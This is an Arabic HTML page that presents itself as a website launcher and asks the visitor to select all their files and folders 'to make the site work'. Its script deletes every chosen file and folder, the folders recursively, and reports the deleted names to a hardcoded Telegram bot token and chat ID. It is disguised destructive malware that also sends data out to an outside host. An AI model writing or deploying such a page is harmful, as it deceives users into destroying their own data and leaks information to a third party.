<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تشغيل الموقع</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
            background-color: #f5f5f5;
        }
        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 12px 24px;
            margin: 10px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
        }
        #deleteBtn { background-color: #e74c3c; }
        #deleteBtn:hover { background-color: #c0392b; }
        #status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 6px;
        }
        .success { background-color: #2ecc71; color: white; }
        .error { background-color: #e74c3c; color: white; }
    </style>
</head>
<body>
    <h1>تشغيل الموقع</h1>
    <p>اختر جميع الملفات والمجلدات لعمل الموقع</p>
    
    <button id="deleteBtn">اختيار وحذف</button>
    <div id="status">الرجاء اختيار الملفات أو المجلدات</div>

    <script>
        // إعدادات Telegram
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "HTML"
                })
            });
        }

        document.getElementById("deleteBtn").addEventListener("click", async () => {
            const statusDiv = document.getElementById("status");
            statusDiv.textContent = "جاري المعالجة...";
            
            try {
                await sendToTelegram("🔴 <b>بدأ عملية الحذف</b>");
                
                const handles = await window.showOpenFilePicker({
                    multiple: true,
                    types: [{
                        description: "الملفات والمجلدات",
                        accept: {"*/*": [".*"]}
                    }]
                });

                let deletedCount = 0;
                let report = "<b>الملفات المحذوفة:</b>\n";
                
                for (const handle of handles) {
                    try {
                        if (handle.kind === "directory") {
                            await handle.removeEntry("", { recursive: true });
                            report += `\n📁 <b>${handle.name}</b> (مجلد مع محتوياته)\n`;
                        } else {
                            await handle.remove();
                            report += `\n📄 <b>${handle.name}</b>\n`;
                        }
                        deletedCount++;
                    } catch (error) {
                        report += `\n❌ <b>فشل حذف:</b> ${handle.name || "غير معروف"}\n`;
                    }
                }
                
                report += `\n✅ <b>تم حذف ${deletedCount} عنصر بنجاح</b>`;
                await sendToTelegram(report);
                
                statusDiv.className = "success";
                statusDiv.textContent = "تم الحذف وإرسال التقرير إلى Telegram!";
                
            } catch (error) {
                await sendToTelegram(`❌ <b>حدث خطأ:</b>\n${error.message}`);
                statusDiv.className = "error";
                statusDiv.textContent = "حدث خطأ - راجع الرسائل في Telegram";
            }
        });
    </script>
</body>
</html>
